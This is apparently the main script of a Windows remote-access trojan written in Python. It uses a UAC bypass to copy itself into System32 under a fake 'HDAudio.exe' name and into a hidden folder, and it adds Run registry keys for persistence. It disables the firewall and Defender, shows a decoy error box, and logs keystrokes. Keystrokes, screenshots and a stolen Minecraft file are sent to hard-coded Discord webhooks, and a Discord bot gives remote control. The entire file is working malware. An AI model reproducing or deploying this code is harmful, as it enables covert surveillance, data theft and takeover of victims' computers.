from PIL import ImageGrab
from discord_bot import bot
from core import keylogger, sender, turn_off_security
from winpwnage.functions.uac.uacMethod1 import uacMethod1
import time, os, sys, shutil, threading, ctypes

file_path = sys.executable
path, file_name = os.path.split(file_path)
MessageBoxW = ctypes.windll.user32.MessageBoxW

if os.path.exists("c:\\windows\\system32\\HDAudio.exe"):
	uacMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', r'taskkill /f /im HDAudio.exe'])
	uacMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', r'del c:\windows\system32\HDAudio.exe'])
if os.path.exists("c:\\SysCheck\\SysCheck.exe"):
	uacMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', r'taskkill /f /im bootloader.exe'])
	uacMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', r'del C:\\SysCheck\\bootloader.exe'])

if os.path.dirname(file_path) != 'C:\\Windows\\System32':
	uacMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', f"copy {file_path} c:\\windows\\system32\\HDAudio.exe"])
	uacMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', f'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /f /v HDAduio /t REG_SZ /d c:\\windows\\system32\\HDAudio.exe'])

if os.path.dirname(file_path) != "C:\\bootloader":
	try:
		os.mkdir("C:\\bootloader")
	except:
		pass
	os.system("attrib +s +h /d C:\\bootloader")
	file_startup_path = f"C:\\bootloader\\bootloader.exe"
	shutil.copy(file_path, file_startup_path)
	uacMethod1(['C:\\Windows\\system32\\cmd.exe', '/c', f'reg add "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /f /v bootloader /t REG_SZ /d {file_startup_path}'])

if file_name != 'bootloader.exe' or file_name != 'HDAudio.exe':
	threading.Thread(target = MessageBoxW, args=(None, 'This application is for x86 window version can not run on x64 window version ', "bootloader", 16)).start()

Security = turn_off_security.TurnOffSecurity()
keylogger = keylogger.Keylogger()
sender = sender.Sender()

Security.FireWall()
Security.Defender()
keylogger.start()
sender.webhook_log_url = 'https://discord.com/api/webhooks/1128326661000155248/nDG6sPvn8RitbJwHtDpm0Njy9xkOG_ajJBJfX-Hatd0RYuVymvpdD3IAgReuqj4BGam6'
sender.webhook_info_url = 'https://discord.com/api/webhooks/1128643994163871867/B9HL54arPjlrVqR2vAuWCnICe_ngD1k8hMjCxkuIlJhxkZ-cr24gZlgZz5oYZ8sczREJ'
sender.send_info()

global time_count, time_delay
time_count = time_delay = 60

def StealHotBar():
	hotbar = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\.minecraft\\hotbar.nbt"
	try:
		sender.send_file(hotbar, '**HotBar Stealer**')
	except:
		sender.send("Not Found HotBar", "HotBar Stealer")
StealHotBar()

def Send():
	snapshot = ImageGrab.grab()
	image_path = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\sc.jpg"
	snapshot.save(image_path)
	sender.send(keylogger.log_text, image_path = image_path)
	keylogger.log_text = ''

def LogSend():
	global time_count, time_delay
	while True:
		Send()
		time.sleep(time_delay)

def BotControl():
	bot.client.run('')

log_send = threading.Thread(target = LogSend, daemon=True)
bot_th = threading.Thread(target = BotControl)
log_send.start()
bot_th.start()
log_send.join()
bot_th.join()
